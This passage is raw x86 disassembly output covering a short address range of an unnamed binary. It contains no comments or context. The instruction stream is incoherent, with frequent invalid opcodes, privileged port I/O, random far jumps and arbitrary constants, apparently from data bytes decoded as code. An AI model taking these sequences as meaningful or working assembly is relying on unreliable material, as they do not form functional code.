  4156ff:	fnstcw WORD PTR [edi-0x4c3ec89e]
  415705:	and    al,0x46
  415707:	jo     0x41574b
  415709:	or     eax,0xf6084725
  41570e:	rol    eax,1
  415710:	cld    
  415711:	ins    BYTE PTR es:[edi],dx
  415712:	pop    ecx
  415714:	dec    ebp
  415715:	jno    0x4156aa
  415717:	aaa    
  415718:	jae    0x4156dc
  41571a:	push   DWORD PTR [edx]
  41571c:	rol    DWORD PTR [esi],1
  41571e:	xor    bh,BYTE PTR [eax+0x3f]
  415721:	jae    0x415776
  415723:	push   0x7d919d33
  415728:	sti    
  415729:	iret   
  41572a:	es mov edx,0xc7a2415e
  415730:	nop
  415731:	in     eax,dx
  415732:	or     dh,ch
  415734:	mov    bh,0xae
  415736:	push   ebp
  415737:	xor    bh,BYTE PTR [ecx+0x7f]
  41573a:	(bad)  
  41573b:	pop    ecx
  41573c:	pop    eax
  41573d:	addr16 push esp
  41573f:	shl    BYTE PTR [ecx],1
  415741:	rcr    bh,1
  415743:	popa   
  415744:	js     0x415726
  415746:	lods   al,BYTE PTR ds:[esi]
  415747:	mov    ds:0xb0148cbb,eax
  41574c:	mov    ch,0x1c
  41574e:	stos   DWORD PTR es:[edi],eax
  41574f:	aas    
  415750:	and    ch,BYTE PTR [ebx]
  415752:	popf   
  415753:	adc    al,0x44
  415755:	mov    BYTE PTR [ecx],dl
  415757:	gs push ebp
  415759:	std    
  41575a:	pop    esi
  41575b:	pop    ecx
  41575c:	imul   edx,DWORD PTR [edi],0xff404706
  415762:	retf   0x6573
  415765:	mov    ebx,0x15ebcb9b
  41576a:	mov    BYTE PTR [ebx-0x32923547],ah
  415770:	dec    edi
  415771:	pop    eax
  415772:	outs   dx,DWORD PTR ds:[esi]
  415773:	dec    ecx
  415774:	or     al,0x0
  415776:	outs   dx,DWORD PTR ds:[esi]
  415777:	add    al,0x7d
  415779:	fld    TBYTE PTR [edi]
  41577b:	or     ecx,DWORD PTR ds:0xd2a2d71e
  415781:	or     al,0xe6
  415783:	loopne 0x415760
  415785:	dec    ebx
  415786:	(bad)  
  415788:	arpl   WORD PTR [ecx],bp
  41578a:	sbb    al,0xfa
  41578c:	js     0x4157fa
  41578e:	(bad)  
  415790:	push   esi
  415791:	test   BYTE PTR [edi+ebp*8+0x57466dd7],ah
  415798:	imul   esp,ebp,0xfd098d4c
  41579e:	stos   BYTE PTR es:[edi],al
  41579f:	loope  0x4157dc
  4157a1:	and    dh,cl
  4157a3:	outs   dx,BYTE PTR ds:[esi]
  4157a4:	mov    edx,0xda99535d
  4157a9:	pusha  
  4157aa:	mov    ebx,0x68e874ca
  4157af:	stos   BYTE PTR es:[edi],al
  4157b0:	sub    al,0xa9
  4157b2:	test   DWORD PTR [ecx+0x2a],esp
  4157b5:	dec    ebx
  4157b6:	add    eax,0x21843df0
  4157bb:	(bad)  
  4157bc:	xor    al,0x1c
  4157be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157bf:	mov    ebp,0xbaf55bc5
  4157c4:	adc    al,0x73
  4157c6:	mov    bh,0xbb
  4157c8:	loopne 0x4157c2
  4157ca:	loopne 0x41577e
  4157cc:	cmp    ch,cl
  4157ce:	mov    ebx,0xd05b2c7e
  4157d3:	add    BYTE PTR [eax-0x78],cl
  4157d6:	mov    al,ds:0x70248f82
  4157db:	repz jmp 0x2b50:0x254a2297
  4157e3:	or     bl,dl
  4157e5:	iret   
  4157e6:	sub    DWORD PTR [ebx+0x51371288],0x41766d10
  4157f0:	mov    al,0x96
  4157f2:	sbb    DWORD PTR [ebx+0x4],0xada02e88
  4157f9:	xor    eax,0xdf2518c6
  4157fe:	data16 hlt 
  415800:	dec    ecx
  415801:	mov    eax,0x8c902b60
  415806:	dec    ebx
  415807:	nop
  415808:	mov    edi,0xbaadeed3
  41580d:	pop    ss
  41580e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41580f:	sub    BYTE PTR [ebx],cl
  415811:	cdq    
  415812:	xchg   esi,eax
  415813:	aam    0xc5
  415815:	jmp    0xf1cf:0xfe256d86
  41581c:	mov    ecx,0x2f223af7
  415821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415822:	sub    DWORD PTR [edi],eax
  415824:	daa    
  415825:	aam    0x2c
  415827:	xlat   BYTE PTR ds:[ebx]
  415828:	pop    edx
  415829:	jmp    0x415829
  41582b:	pop    ebp
  41582c:	push   es
  41582d:	sbb    eax,0xdfb78111
  415832:	xor    ebp,DWORD PTR [eax+0x3e]
  415835:	jo     0x415884
  415837:	add    dh,BYTE PTR [esi+0x9784b58]
  41583d:	push   esp
  41583e:	js     0x415849
  415840:	popa   
  415841:	mov    esp,0x22893019
  415846:	das    
  415847:	stos   BYTE PTR es:[edi],al
  415848:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415849:	xchg   esi,eax
  41584a:	retf   
  41584b:	std    
  41584c:	test   DWORD PTR [esi-0x6f],ebx
  41584f:	inc    edi
  415850:	pop    ebx
  415851:	sbb    cl,BYTE PTR [eax]
  415853:	fisttp WORD PTR [ecx-0x11]
  415856:	pop    eax
  415857:	push   eax
  415858:	lods   eax,DWORD PTR ds:[esi]
  415859:	cmp    ah,bl
  41585b:	sub    dl,BYTE PTR [esi+edx*8-0x33127ce3]
  415862:	scas   eax,DWORD PTR es:[edi]
  415863:	xchg   ebp,eax
  415864:	and    DWORD PTR [edx+0x11cb7e1a],edx
  41586a:	push   esp
  41586b:	repnz (bad) 
  41586d:	cmp    al,0xfc
  41586f:	ror    BYTE PTR [ebp-0x6c],0x7d
  415873:	cmp    DWORD PTR ds:[edx+eax*4+0x29],edi
  415878:	in     al,dx
  415879:	(bad)  
  41587a:	push   edx
  41587b:	lock cld 
  41587d:	xchg   DWORD PTR ds:0xb3f366b6,eax
  415883:	jo     0x415902
  415885:	loope  0x41589a
  415887:	ds fmulp st(3),st
  41588a:	xor    edi,edi
  41588c:	popa   
  41588d:	mov    eax,0xc5b33e2e
  415892:	aam    0xe1
  415894:	dec    esi
  415895:	push   DWORD PTR [edi-0x29]
  415898:	pop    ebp
  415899:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41589a:	jae    0x41588a
  41589c:	gs addr16 inc eax
  41589f:	add    ch,0x5
  4158a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158a3:	cdq    
  4158a4:	push   ds
  4158a5:	in     al,dx
  4158a6:	cmp    eax,0xdae84336
  4158ab:	call   0x72c3:0x11b81db8
  4158b2:	fistp  WORD PTR [esi*2-0x2e2679d5]
  4158b9:	outs   dx,DWORD PTR ds:[esi]
  4158ba:	sbb    dl,BYTE PTR [edx+0x49]
  4158bd:	dec    ecx
  4158be:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4158c0:	mov    cl,0x30
  4158c2:	xchg   BYTE PTR [edx+eax*8],bl
  4158c5:	push   edi
  4158c6:	lea    edx,[edi+eiz*8+0x1d49d0e5]
  4158cd:	ins    BYTE PTR es:[di],dx
  4158cf:	jg     0x4158ac
  4158d1:	ja     0x4158f9
  4158d3:	pop    esi
  4158d4:	adc    esp,0x14b9315c
  4158da:	sub    DWORD PTR [ebx-0x3a4b5ba9],edx
  4158e0:	rcl    BYTE PTR [edi+0x5a],cl
  4158e3:	ins    BYTE PTR es:[edi],dx
  4158e4:	(bad)  
  4158e5:	fdivp  st(7),st
  4158e7:	(bad)  [edi+0x10e16ee3]
  4158ed:	jns    0x4158b3
  4158ef:	push   esi
  4158f0:	mov    WORD PTR [ecx+edx*2-0x7077ed67],fs
  4158f7:	pop    es
  4158f8:	js     0x4158bc
  4158fa:	pop    edi
  4158fb:	jp     0x4158c4
  4158fd:	cmp    ch,ah
  4158ff:	mov    eax,0x247fb607
  415904:	jmp    0x4158ce
  415906:	call   0xb458:0xc485f126
  41590d:	rcl    BYTE PTR [esi],cl
  41590f:	jge    0x41591f
  415911:	pop    esp
  415912:	std    
  415913:	ss and al,0xfe
  415916:	lock pop ds
  415918:	sti    
  415919:	ins    DWORD PTR es:[edi],dx
  41591a:	aas    
  41591b:	repz dec eax
  41591d:	mov    ch,0xb1
  41591f:	and    esp,DWORD PTR [ebp+0x5385975a]
  415925:	lahf   
  415926:	and    ebp,DWORD PTR [ecx]
  415928:	mov    es,WORD PTR cs:[edx+0x17007db]
  41592f:	loope  0x415944
  415931:	cmp    BYTE PTR [edx+0x43],cl
  415934:	and    eax,esp
  415936:	jno    0x4158c7
  415938:	int3   
  415939:	dec    ebx
  41593a:	test   DWORD PTR [ebp+ebx*4-0x7e],ecx
  41593e:	cli    
  41593f:	jmp    0x415930
  415941:	push   esi
  415942:	daa    
  415943:	outs   dx,DWORD PTR ds:[esi]
  415944:	add    eax,0x1c88c670
  415949:	test   DWORD PTR [edx+ebx*1+0x5a5e477b],eax
  415950:	je     0x415979
  415952:	retf   0x9e06
  415955:	imul   edi,ebp,0xffffffbe
  415958:	in     eax,0x71
  41595a:	out    dx,al
  41595b:	cmp    DWORD PTR [esi+0x5f98c6b4],0xffffffed
  415962:	sbb    BYTE PTR ds:0x97181aec,bl
  415968:	mov    ecx,0x185ba2fa
  41596d:	call   0xfc8eeb36
  415972:	jne    0x41598c
  415974:	in     al,dx
  415975:	mov    ds:0x19767c6f,eax
  41597a:	test   al,0xae
  41597c:	shl    DWORD PTR [edi-0x5b],0x44
  415980:	dec    edi
  415981:	mov    dl,0x1c
  415983:	inc    edi
  415984:	pop    ds
  415985:	adc    eax,0x3ae47c70
  41598a:	push   esp
  41598b:	ret    
  41598c:	jecxz  0x415937
  41598e:	dec    edi
  41598f:	ret    
  415990:	bound  eax,QWORD PTR [edi-0x50e8a740]
  415996:	and    edx,esi
  415998:	aaa    
  415999:	jmp    0x415a0b
  41599b:	push   ebx
  41599c:	in     eax,dx
  41599d:	jmp    0x4159b1
  41599f:	sbb    BYTE PTR [ebx],0x83
  4159a2:	daa    
  4159a3:	adc    eax,0x5498a04c
  4159a8:	jmp    edx
  4159aa:	(bad)  
  4159ab:	shl    al,cl
  4159ad:	xchg   ebp,eax
  4159ae:	iret   
  4159af:	pushf  
  4159b0:	mov    ah,0xe5
  4159b2:	lods   al,BYTE PTR ds:[esi]
  4159b3:	or     al,0x4b
  4159b5:	mov    cs,ecx
  4159b7:	inc    esp
  4159b8:	scas   al,BYTE PTR es:[edi]
  4159b9:	xor    eax,0x3f4b7d60
  4159be:	jp     0x4159ab
  4159c0:	nop
  4159c1:	(bad)  [edi]
  4159c3:	rcl    DWORD PTR [ecx-0x74ac5b60],1
  4159c9:	popa   
  4159ca:	mov    ds:0x810a5b4c,eax
  4159cf:	cmp    esp,0x5e
  4159d2:	push   edi
  4159d3:	idiv   DWORD PTR [ecx]
  4159d5:	push   eax
  4159d6:	pop    ecx
  4159d7:	pop    esi
  4159d8:	cli    
  4159d9:	(bad)  
  4159da:	in     al,0x1c
  4159dc:	sub    eax,DWORD PTR [edx+0x6c]
  4159df:	les    edx,FWORD PTR [edi-0x638f5cfe]
  4159e5:	je     0x415a23
  4159e7:	xchg   ebp,eax
  4159e8:	and    al,0x56
  4159ea:	loopne 0x415a21
  4159ec:	call   0xff45e476
  4159f1:	adc    eax,0xf7ed4a35
  4159f6:	mov    ah,0x8b
  4159f8:	dec    edx
  4159f9:	ja     0x415a1f
  4159fb:	(bad)  
  4159fc:	shl    BYTE PTR [edi],cl
  4159fe:	sbb    al,0xf2
  415a00:	sbb    al,0x77
  415a02:	sub    ebx,esp
  415a04:	cwde   
  415a05:	and    ebp,ebx
  415a07:	js     0x415a6d
  415a09:	nop
  415a0a:	in     al,0xf9
  415a0c:	cmp    cl,al
  415a0e:	rcl    DWORD PTR [edx+edi*2-0x54],0xbf
  415a13:	shr    DWORD PTR [edi],0x1d
  415a16:	popf   
  415a17:	mov    cl,0x39
  415a19:	or     esi,edi
  415a1b:	jb     0x41599f
  415a1d:	ret    
  415a1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a1f:	lea    esp,[edx+0x68]
  415a22:	fild   WORD PTR [ecx]
  415a24:	xchg   ecx,eax
  415a25:	cmp    al,0xcc
  415a27:	mov    eax,0xf987b45c
  415a2c:	mov    edi,0x89753ab9
  415a31:	test   al,0xd5
  415a33:	adc    al,0x3b
  415a35:	sub    DWORD PTR [edi],ebp
  415a37:	ficom  WORD PTR [ecx+0x2676047b]
  415a3d:	leave  
  415a3e:	mov    ch,0x10
  415a40:	test   edx,edx
  415a42:	cmp    eax,0xa2d4d45e
  415a47:	fld    TBYTE PTR [eax+ebx*1]
  415a4a:	and    al,0x94
  415a4c:	pop    DWORD PTR [edi+0x12]
  415a4f:	mov    ebp,0xb04488ee
  415a54:	leave  
  415a55:	mov    al,ds:0x10b1724f
  415a5a:	outs   dx,BYTE PTR ds:[esi]
  415a5b:	into   
  415a5c:	inc    esp
  415a5d:	cli    
  415a5e:	and    ch,BYTE PTR [esi-0x789e3a]
  415a64:	retf   
  415a65:	cmp    al,0x63
  415a67:	cmc    
  415a68:	jne    0x415a3a
  415a6a:	mov    al,BYTE PTR [edi]
  415a6c:	aas    
  415a6d:	jae    0x415aa2
  415a6f:	cmp    BYTE PTR [ebx],cl
  415a71:	pop    edi
  415a72:	cld    
  415a73:	sbb    DWORD PTR [ebp-0x6cce307],ebx
  415a79:	jns    0x415a8f
  415a7b:	and    bl,ah
  415a7d:	pusha  
  415a7e:	aas    
  415a7f:	retf   
  415a80:	sub    BYTE PTR ds:0xf13315a5,bh
  415a86:	inc    esi
  415a87:	xor    al,0x50
  415a89:	add    DWORD PTR ds:0x1712b3ca,ecx
  415a8f:	inc    edx
  415a90:	adc    eax,0xb9c3aeb1
  415a95:	sbb    DWORD PTR [ecx],0xffffffc7
  415a98:	and    DWORD PTR [edi+eax*2+0x6250fc31],esp
  415a9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415aa0:	shr    DWORD PTR [edx+0x11],1
  415aa3:	inc    edx
  415aa4:	mov    eax,ds:0x6c0a30ab
  415aa9:	mov    al,ds:0x167448cc
  415aae:	inc    esp
  415aaf:	pop    ds
  415ab0:	adc    dl,BYTE PTR [esi]
  415ab2:	(bad)  
  415ab3:	or     eax,0xa3555e32
  415ab8:	into   
  415ab9:	ss mov BYTE PTR es:[eax+0x38],dl
  415abe:	mov    eax,esi
  415ac0:	shl    BYTE PTR [edi],1
  415ac2:	(bad)  
  415ac3:	loopne 0x415acf
  415ac5:	jmp    0x8691d4e0
  415aca:	cli    
  415acb:	loopne 0x415b39
  415acd:	cmp    eax,0xbb573e3e
  415ad2:	push   ebx
  415ad3:	mov    dl,0xd4
  415ad5:	mov    esp,DWORD PTR [ebp-0x28]
  415ad8:	cmc    
  415ad9:	inc    ebx
  415ada:	mov    dl,0x81
  415adc:	retf   0xe1cc
  415adf:	push   edi
  415ae0:	jle    0x415b0a
  415ae2:	push   esi
  415ae3:	jb     0x415af1
  415ae5:	push   es
  415ae6:	mov    bx,gs
  415ae9:	sub    ebx,DWORD PTR [ebp-0x5f]
  415aec:	icebp  
  415aed:	out    0x19,al
  415aef:	and    DWORD PTR [ecx-0x1b],0x1a07103c
  415af6:	hlt    
  415af7:	ret    
  415af8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415af9:	sbb    edi,esi
  415afb:	bound  ecx,QWORD PTR [ebp+0x11]
  415afe:	or     eax,0x5ea72b58
  415b03:	shr    cl,cl
  415b05:	sbb    eax,0x7efa3b10
  415b0a:	bound  ebx,QWORD PTR [esi]
  415b0c:	fisubr WORD PTR ds:0x976cbdd2
  415b12:	(bad)  
  415b13:	push   cs
  415b14:	push   ecx
  415b15:	adc    ah,cl
  415b17:	mov    esi,0x2ee8deec
  415b1c:	or     BYTE PTR ds:0xae815653,ah
  415b22:	mov    al,0x8f
  415b24:	lea    edi,[edi+0x7a]
  415b27:	and    eax,0xae567d05
  415b2c:	xor    DWORD PTR [eax+0x2ba9ab78],ebp
  415b32:	inc    ebp
  415b33:	aad    0x46
  415b35:	jge    0x415b11
  415b37:	aas    
  415b38:	loopne 0x415b44
  415b3a:	dec    ecx
  415b3b:	sbb    DWORD PTR ss:[ecx+0x3dfafc19],ecx
  415b42:	gs add al,bl
  415b45:	loop   0x415b42
  415b47:	cmp    BYTE PTR [esi-0x674f40b3],cl
  415b4d:	outs   dx,DWORD PTR ds:[esi]
  415b4e:	rcr    ecx,0xbd
  415b51:	pop    eax
  415b52:	hlt    
  415b53:	aad    0xfe
  415b55:	aam    0xbc
  415b57:	jno    0x415b32
  415b59:	pop    esi
  415b5a:	(bad)  
  415b5b:	out    0xab,al
  415b5d:	(bad)  
  415b5e:	das    
  415b5f:	lods   eax,DWORD PTR ds:[esi]
  415b60:	pop    ecx
  415b61:	stos   DWORD PTR es:[edi],eax
  415b62:	sbb    dh,bh
  415b64:	push   ds
  415b65:	adc    bl,BYTE PTR [esi+eiz*8-0xb]
  415b69:	mov    edi,0x38734a0a
  415b6e:	adc    BYTE PTR [eax],dh
  415b70:	mov    ah,BYTE PTR [esi]
  415b72:	xor    eax,0x94d2a0ac
  415b77:	repnz icebp 
  415b79:	cmp    al,0x6b
  415b7b:	add    eax,0xefd83af0
  415b80:	pop    edx
  415b81:	(bad)  
  415b82:	ds jle 0x415bd0
  415b85:	stc    
  415b86:	pop    ss
  415b87:	cmp    ah,BYTE PTR [ecx+0x22]
  415b8a:	in     eax,0x19
  415b8c:	popa   
  415b8d:	xchg   ecx,eax
  415b8e:	ror    DWORD PTR [esp+eax*4],0x70
  415b92:	lea    ebx,[esi]
  415b94:	xor    ch,BYTE PTR [ebp*2-0x76902512]
  415b9b:	xlat   BYTE PTR ds:[ebx]
  415b9c:	add    ah,al
  415b9e:	rcl    BYTE PTR [esi],cl
  415ba0:	pusha  
  415ba1:	les    ebx,FWORD PTR [eiz*1+0x323ca4c6]
  415ba8:	and    al,0xa7
  415baa:	mov    BYTE PTR [ebx],bh
  415bac:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bae:	das    
  415baf:	clc    
  415bb0:	xchg   edx,eax
  415bb1:	cs int3 
  415bb3:	arpl   WORD PTR [eax+0x2b],ax
  415bb6:	cmp    BYTE PTR [ebp-0x73568bba],cl
  415bbc:	add    eax,DWORD PTR [esi-0x2ccf9335]
  415bc2:	push   ss
  415bc3:	pop    es
  415bc4:	add    eax,0xb1d67397
  415bc9:	lahf   
  415bca:	call   FWORD PTR [eax-0x1d]
  415bcd:	gs mov bh,0x83
  415bd0:	push   cs
  415bd1:	adc    eax,0xde02671d
  415bd6:	and    DWORD PTR [esi+ebx*8],edx
  415bd9:	sbb    eax,0x39d9cb1a
  415bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415bdf:	xor    ch,cl
  415be1:	call   0x6ac5:0xc5cf7401
  415be8:	jp     0x415c31
  415bea:	and    ch,al
  415bec:	xchg   edi,eax
  415bed:	outs   dx,DWORD PTR ds:[esi]
  415bee:	int3   
  415bef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415bf0:	push   ss
  415bf1:	rcl    DWORD PTR [eax+edx*1+0x4d],0xe
  415bf6:	cld    
  415bf7:	sub    BYTE PTR [esi+0x2e],dh
  415bfa:	xchg   ebp,eax
  415bfb:	test   DWORD PTR [edi+0x4d2d2c24],edi
  415c01:	scas   al,BYTE PTR es:[edi]
  415c02:	push   es
  415c03:	(bad)  
  415c05:	xchg   ebp,eax
  415c06:	fnstenv [esi]
  415c08:	or     DWORD PTR [edx+0x61],esp
  415c0b:	hlt    
  415c0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c0d:	cmp    dl,BYTE PTR [ecx+0x3dbd18a1]
  415c13:	sti    
  415c14:	push   ecx
  415c15:	shl    BYTE PTR [edx+0x7b],1
  415c18:	xchg   ebp,eax
  415c19:	push   ecx
  415c1a:	mov    dh,0x26
  415c1c:	sub    al,0xf7
  415c1e:	outs   dx,DWORD PTR ds:[esi]
  415c1f:	iret   
  415c20:	xchg   ebx,eax
  415c21:	add    dh,BYTE PTR [ebx-0x80]
  415c24:	lea    ecx,[eax]
  415c26:	jno    0x415c34
  415c28:	loope  0x415c01
  415c2a:	dec    edi
  415c2b:	cmp    BYTE PTR [eax-0x32],al
  415c2e:	mov    BYTE PTR [ebp+0x21],ch
  415c31:	ss jp  0x415ca4
  415c34:	or     bh,BYTE PTR [ebp+eax*4+0xaaaaa6a]
  415c3b:	jmp    0x1715:0xe54feb1d
  415c42:	daa    
  415c43:	(bad)  
  415c44:	xor    dl,BYTE PTR [ebp-0x6052c8eb]
  415c4a:	push   es
  415c4b:	bsr    ebp,DWORD PTR [ebx+0x6b]
  415c4f:	fadd   QWORD PTR [ebx+0x24b64bf5]
  415c55:	imul   DWORD PTR [edi]
  415c57:	fmul   QWORD PTR [ecx-0x24]
  415c5a:	mov    ecx,0x151d1136
  415c5f:	add    dh,BYTE PTR [ebx+0x2274945b]
  415c65:	cld    
  415c66:	fstp   QWORD PTR [edi+edi*4-0x71bb0ca9]
  415c6d:	mov    cl,0x5b
  415c6f:	mov    bl,0x27
  415c71:	shl    DWORD PTR [ecx],1
  415c73:	mov    WORD PTR [ebp+ebp*8+0x7efd6e6a],ss
  415c7a:	daa    
  415c7b:	mov    eax,ds:0x2ba6e2f0
  415c80:	mov    cl,0x12
  415c82:	popf   
  415c83:	push   ebx
  415c84:	sub    BYTE PTR [ebp-0x585c1ad1],ah
  415c8a:	adc    al,0x68
  415c8c:	fld    QWORD PTR ds:0x610f24ff
  415c92:	imul   esi,DWORD PTR [edi+0x7eb1c2ec],0xd
  415c99:	or     edx,0x29a7f643
  415c9f:	jle    0x415c7f
  415ca1:	cmp    al,0x87
  415ca3:	mov    ebp,0xbbe8b7f4
  415ca8:	pusha  
  415ca9:	xor    eax,DWORD PTR [esp+ecx*1+0x2887118f]
  415cb0:	cs mov eax,0x91f459de
  415cb6:	or     eax,0xb71c52cc
  415cbb:	jg     0x415cfe
  415cbd:	adc    DWORD PTR [ebx+0x7a],ebp
  415cc0:	or     ch,BYTE PTR [eax-0x75a21534]
  415cc6:	sbb    DWORD PTR [edi-0x283edc60],ebx
  415ccc:	sbb    eax,0xf15a942a
  415cd1:	and    BYTE PTR [ecx+esi*2-0x57],bl
  415cd5:	mov    ds:0x4db4e61c,eax
  415cda:	add    ecx,ebx
  415cdc:	fisttp QWORD PTR ds:0x20f2f0b1
  415ce2:	add    DWORD PTR [edx+0x511661a7],esi
  415ce8:	das    
  415ce9:	xor    al,0x85
  415ceb:	mov    WORD PTR [ebx+eax*2+0x7f60610f],es
  415cf2:	into   
  415cf3:	push   esp
  415cf4:	addr16 repz cmc 
  415cf7:	lods   al,BYTE PTR ds:[esi]
  415cf8:	not    BYTE PTR [edx-0x12]
  415cfb:	mov    cl,0xd0
  415cfd:	add    al,0xe5
  415cff:	or     eax,0xbac948e
  415d04:	jmp    0x415cd5
  415d06:	sub    eax,0x609dafad
  415d0b:	mov    esi,fs
  415d0d:	push   ecx
  415d0e:	jle    0x415d80
  415d10:	cmp    eax,0xb4fb899a
  415d15:	or     DWORD PTR [ecx+0x12],ebp
  415d18:	retf   0x2032
  415d1b:	loopne 0x415cf4
  415d1d:	jmp    0x66ca:0x8b62da33
  415d24:	inc    ebp
  415d25:	xchg   DWORD PTR [esi-0x1a],ecx
  415d28:	lods   eax,DWORD PTR ds:[esi]
  415d29:	in     al,dx
  415d2a:	hlt    
  415d2b:	xor    DWORD PTR [ebx],0x4c
  415d2e:	ins    BYTE PTR es:[edi],dx
  415d2f:	xchg   esp,eax
  415d30:	int    0x39
  415d32:	mov    dh,0x5f
  415d34:	loop   0x415cfa
  415d36:	mov    al,0xf9
  415d38:	sbb    eax,0xd5b7b18f
  415d3d:	pop    ecx
  415d3e:	je     0x415dbc
  415d40:	pushf  
  415d41:	fdivr  QWORD PTR ss:[ecx-0x3c]
  415d45:	xchg   ebp,eax
  415d46:	fdivr  DWORD PTR [edx]
  415d48:	les    ebx,FWORD PTR [eax]
  415d4a:	jbe    0x415dbd
  415d4c:	(bad)  
  415d4d:	cmp    eax,0xfb386132
  415d52:	(bad)
  415d55:	mov    ebx,0x9dd4f2f5
  415d5a:	inc    ecx
  415d5b:	jmp    0xcd16:0xc0948829
  415d62:	sar    esp,cl
  415d64:	cmp    DWORD PTR [esi],0x9
  415d67:	ror    ch,1
  415d69:	out    0x1d,eax
  415d6b:	ja     0x415d86
  415d6d:	jns    0x415d32
  415d6f:	mov    ecx,DWORD PTR [ebx]
  415d71:	(bad)  
  415d72:	loope  0x415cfe
  415d74:	dec    eax
  415d75:	jne    0x415dbc
  415d77:	push   esi
  415d78:	sub    al,0xe1
  415d7a:	push   cs
  415d7b:	cld    
  415d7c:	test   al,0x7c
  415d7e:	ret    0x13f4
  415d81:	enter  0x3c15,0xb6
  415d85:	jle    0x415dcf
  415d87:	and    bl,dl
  415d89:	in     al,dx
  415d8a:	and    eax,0x645ce7c8
  415d8f:	(bad)  
  415d90:	add    cl,BYTE PTR [ecx]
  415d92:	js     0x415d3c
  415d94:	xchg   esp,eax
  415d95:	mov    eax,0xdd063b06
  415d9a:	loop   0x415d5f
  415d9c:	out    dx,eax
  415d9d:	pop    esp
  415d9e:	mov    bh,0xc8
  415da0:	mov    eax,ds:0x4293127d
  415da5:	call   0x3374a0ce
  415daa:	retf   0x4b3b
  415dad:	int    0x17
  415daf:	and    ecx,DWORD PTR [ecx-0x3b]
  415db2:	sbb    al,0x63
  415db4:	adc    al,0xb8
  415db6:	jo     0x415e36
  415db8:	mov    esi,0xf70c81f7
  415dbd:	sbb    ebp,esp
  415dbf:	pop    edx
  415dc0:	sub    cl,BYTE PTR [ecx+0xddfe109]
  415dc6:	(bad)  
  415dc7:	xchg   edx,eax
  415dc8:	adc    eax,0x2a1212de
  415dcd:	and    al,0x27
  415dcf:	les    edx,FWORD PTR [edx]
  415dd1:	jg     0x415d6c
  415dd3:	test   eax,0x224c5a92
  415dd8:	scas   al,BYTE PTR es:[edi]
  415dd9:	cwde   
  415dda:	in     eax,0xb5
  415ddc:	xchg   esp,eax
  415ddd:	and    dl,dl
  415ddf:	xchg   ecx,eax
  415de0:	add    cl,dh
  415de2:	mov    ebp,DWORD PTR [edx-0x23]
  415de5:	shl    BYTE PTR [edx-0xa],0xee
  415de9:	jno    0x415d6e
  415deb:	mov    ?,WORD PTR [ebx-0x66]
  415dee:	and    ebp,DWORD PTR ss:[edi-0x3d]
  415df2:	mov    al,ds:0x9c9bfac7
  415df7:	lods   al,BYTE PTR ds:[esi]
  415df8:	sbb    al,0xe7
  415dfa:	in     al,dx
  415dfb:	sbb    BYTE PTR [ebx],dh
  415dfd:	add    ebp,DWORD PTR [ebx+0x70]
  415e00:	popa   
  415e01:	call   FWORD PTR [edx-0x41cd8810]
  415e07:	jle    0x415d8f
  415e09:	dec    ebx
  415e0a:	push   es
  415e0b:	int3   
  415e0c:	dec    ebp
  415e0d:	iret   
  415e0e:	jmp    0x415dda
  415e10:	ror    bh,0x90
  415e13:	mov    dh,bl
  415e15:	jbe    0x415dd8
  415e17:	shl    DWORD PTR [ecx-0x76],1
  415e1a:	mov    eax,0x6dd198bf
  415e1f:	test   DWORD PTR [ecx],ecx
  415e21:	inc    edi
  415e22:	xchg   ebx,eax
  415e23:	push   ebx
  415e24:	out    dx,al
  415e25:	fdiv   DWORD PTR [ebx+0x44ba04c8]
  415e2b:	lods   eax,DWORD PTR ds:[esi]
  415e2c:	mov    dh,0x88
  415e2e:	jb     0x415e00
  415e30:	and    al,0xf9
  415e32:	(bad)
  415e35:	in     al,dx
  415e36:	jge    0x415e4e
  415e38:	pop    ecx
  415e39:	(bad)  
  415e3b:	jbe    0x415e5c
  415e3d:	pushf  
  415e3e:	cmp    ebp,eax
  415e40:	loope  0x415e19
  415e42:	mov    cl,0x2
  415e44:	adc    eax,0xd909cec7
  415e49:	(bad)  
  415e4a:	fnstcw WORD PTR [edi+0x28]
  415e4d:	adc    ch,BYTE PTR [esi]
  415e4f:	stc    
  415e50:	push   ds
  415e51:	repnz jmp 0x4a88:0xd3921a78
  415e59:	sub    BYTE PTR [eax-0x26],0x87
  415e5d:	xchg   ecx,eax
  415e5e:	int    0x5d
  415e60:	and    al,0x48
  415e62:	dec    BYTE PTR [ebp+0x52]
  415e65:	pop    ebp
  415e66:	lock leave 
  415e68:	imul   eax,DWORD PTR ds:0x8cd1d1fa,0x16eb6d21
  415e72:	and    eax,0xdb9a2792
  415e77:	jbe    0x415e69
  415e79:	enter  0x7316,0x36
  415e7d:	sbb    BYTE PTR [eax+0x16],al
  415e80:	ds add al,0xd7
  415e83:	jecxz  0x415ec7
  415e85:	into   
  415e86:	outs   dx,BYTE PTR ds:[esi]
  415e87:	sub    esp,DWORD PTR [esi-0x16fbf931]
  415e8d:	hlt    
  415e8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e8f:	sbb    al,0xee
  415e91:	dec    esi
  415e92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e93:	mov    es,WORD PTR [ecx]
  415e95:	in     al,0x85
  415e97:	iret   
  415e98:	into   
  415e99:	mov    eax,ds:0x785e2e30
  415e9e:	xchg   BYTE PTR [ebx],bh
  415ea0:	jp     0x415e5d
  415ea2:	cmp    al,0x83
  415ea4:	pop    edx
  415ea5:	lea    esp,[esi-0x58a33a15]
  415eab:	lods   eax,DWORD PTR ds:[esi]
  415eac:	out    dx,eax
  415ead:	cmc    
  415eae:	add    DWORD PTR [ecx+0x25e31f79],ebp
  415eb4:	cmp    DWORD PTR [edx+0x438ab8ca],edx
  415eba:	bound  ebx,QWORD PTR [eax-0x353c494a]
